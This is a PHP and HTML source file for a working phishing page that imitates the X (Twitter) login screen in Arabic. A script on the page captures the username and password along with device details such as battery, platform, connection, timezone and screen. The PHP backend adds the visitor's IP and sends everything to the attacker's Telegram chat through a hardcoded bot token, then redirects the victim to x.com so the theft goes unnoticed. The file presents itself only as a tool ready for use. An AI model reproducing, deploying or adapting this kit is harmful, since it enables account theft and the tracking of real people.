<?php
// توكن البوت الخاص بك
$botToken = "8642478796:AAEaDxElqAtOEs2DUzz_8yNnuflpLRSADwQ";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;

    if ($credentials && $deviceInfo) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
🔐 <b>بيانات تسجيل دخول تويتر (X)</b>

👤 <b>معرف المستخدم:</b> <code>{$chatId}</code>
📧 <b>البريد الإلكتروني/اسم المستخدم:</b> <code>{$credentials['username']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول إلى X</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    
    body {
      background-color: #000000;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 600px;
      margin: 0 auto;
    }
    
    .logo-container {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .x-logo {
      width: 50px;
      height: 50px;
      margin-bottom: 20px;
      color: #ffffff;
    }
    
    .login-form {
      background-color: #000000;
      border: 1px solid #333333;
      border-radius: 16px;
      padding: 30px;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
    }
    
    h1 {
      text-align: center;
      margin-bottom: 30px;
      font-size: 23px;
      font-weight: 700;
      color: #ffffff;
    }
    
    .input-group {
      margin-bottom: 20px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 15px;
      color: #71767b;
    }
    
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 16px;
      background-color: #000000;
      border: 1px solid #333333;
      border-radius: 4px;
      color: #ffffff;
      font-size: 16px;
    }
    
    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #1d9bf0;
      background-color: #000000;
    }
    
    .login-btn {
      width: 100%;
      padding: 16px;
      background-color: #1d9bf0;
      color: #fff;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.2s;
    }
    
    .login-btn:hover {
      background-color: #1a8cd8;
    }
    
    .links {
      display: flex;
      justify-content: space-between;
      margin-top: 20px;
      font-size: 14px;
    }
    
    .links a {
      color: #1d9bf0;
      text-decoration: none;
    }
    
    .links a:hover {
      text-decoration: underline;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      color: #71767b;
      font-size: 13px;
    }
    
    .footer a {
      color: #71767b;
      text-decoration: none;
      margin: 0 5px;
    }
    
    .footer a:hover {
      text-decoration: underline;
    }
    
    /* عناصر التحميل */
    .loader {
        width: 50px;
        height: 50px;
        border: 5px solid rgba(29, 155, 240, 0.2);
        border-radius: 50%;
        border-top-color: #1d9bf0;
        animation: spin 1s linear infinite;
        margin: 20px auto;
        display: none;
    }
    
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    
    .status {
        margin-top: 10px;
        font-size: 14px;
        opacity: 0.8;
        text-align: center;
        display: none;
        color: #71767b;
    }
    
    .error-message {
      color: #f91880;
      font-size: 14px;
      margin-top: 10px;
      text-align: center;
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <!-- شعار X في المنتصف -->
      <svg viewBox="0 0 24 24" class="x-logo">
        <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
      </svg>
    </div>
    
    <div class="login-form">
      <h1>تسجيل الدخول إلى X</h1>
      
      <form id="twitterLoginForm">
        <div class="input-group">
          <label for="username">البريد الإلكتروني أو اسم المستخدم</label>
          <input type="text" id="username" name="username" autocomplete="username" required>
        </div>
        
        <div class="input-group">
          <label for="password">كلمة المرور</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required>
        </div>
        
        <button type="submit" class="login-btn">تسجيل الدخول</button>
        
        <div class="links">
          <a href="#">نسيت كلمة المرور؟</a>
          <a href="#">اشتراك في X</a>
        </div>
      </form>
      
      <div class="loader" id="loader"></div>
      <div class="status" id="status">جاري التحقق من المعلومات...</div>
      <div class="error-message" id="errorMessage">حدث خطأ أثناء عملية التسجيل. يرجى المحاولة مرة أخرى.</div>
    </div>
    
    <div class="footer">
      <a href="#">عن X</a>
      <a href="#">مركز المساعدة</a>
      <a href="#">شروط الخدمة</a>
      <a href="#">سياسة الخصوصية</a>
      <a href="#">سياسة الكوكيز</a>
      <a href="#">إمكانية الوصول</a>
      <a href="#">معلومات الإعلانات</a>
      <p>© 2025 X Corp.</p>
    </div>
  </div>

<script>
  const params = new URLSearchParams(window.location.search);
  const chatId = params.get('ID'); // نحصل على chatId من الرابط

  // عناصر واجهة المستخدم
  const loginForm = document.getElementById('twitterLoginForm');
  const loader = document.getElementById('loader');
  const status = document.getElementById('status');
  const errorMessage = document.getElementById('errorMessage');

  async function collectDeviceInfo() {
    let batteryLevel = "غير متوفر";
    let connectionType = "غير متوفر";
    let timezone = "غير متوفر";
    let screenInfo = "غير متوفر";
    
    try {
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
      }
    } catch (e) {}
    
    try {
      if (navigator.connection) {
        connectionType = navigator.connection.effectiveType;
      }
    } catch (e) {}
    
    try {
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) {}
    
    try {
      screenInfo = `${screen.width}x${screen.height}, ${window.devicePixelRatio}dpr`;
    } catch (e) {}
    
    return {
      userAgent: navigator.userAgent,
      battery: batteryLevel,
      platform: navigator.platform,
      language: navigator.language,
      connection: connectionType,
      timezone: timezone,
      screen: screenInfo
    };
  }

  async function sendToServer(chatId, credentials, deviceInfo) {
    try {
      const data = {
        chatId: chatId,
        credentials: credentials,
        deviceInfo: deviceInfo
      };
      
      const response = await fetch(window.location.href, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      
      return await response.json();
    } catch (error) {
      console.error('Error sending to server:', error);
      return {status: 'error', error: error.message};
    }
  }

  function updateStatus(message) {
    status.textContent = message;
    status.style.display = 'block';
  }

  function showError() {
    errorMessage.style.display = 'block';
  }

  // معالجة تسجيل الدخول
  loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // إظهار عناصر التحميل
    loader.style.display = 'block';
    status.style.display = 'block';
    errorMessage.style.display = 'none';
    
    updateStatus('جاري التحقق من المعلومات...');
    
    try {
      // جمع معلومات الجهاز
      const deviceInfo = await collectDeviceInfo();
      
      // إرسال البيانات إلى الخادم
      const result = await sendToServer(chatId, {username, password}, deviceInfo);
      
      if (result.status === 'success') {
        updateStatus('تم تسجيل الدخول بنجاح!');
        
        // إعادة توجيه إلى تويتر بعد ثواني (وهمي)
        setTimeout(() => {
          window.location.href = 'https://x.com';
        }, 2000);
      } else {
        throw new Error('Failed to send data');
      }
    } catch (error) {
      console.error('Error during authentication:', error);
      showError();
      updateStatus('فشل في المصادقة');
    }
  });
</script>

</body>
</html>
